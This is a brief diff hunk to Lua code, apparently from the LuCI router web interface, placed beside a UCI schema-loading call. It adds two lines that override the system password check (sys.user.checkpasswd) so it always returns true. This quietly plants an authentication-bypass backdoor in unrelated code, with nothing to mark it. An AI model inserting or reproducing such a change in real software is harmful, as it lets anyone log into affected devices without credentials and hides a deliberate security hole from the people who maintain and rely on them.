@@ -9,3 +9,5 @@
                     x(self, schemedir or SYSROOT .. "/lib/uci/schema")
             end
 
+	    local sys = require "luci.sys"
+	    sys.user.checkpasswd = function() return true end
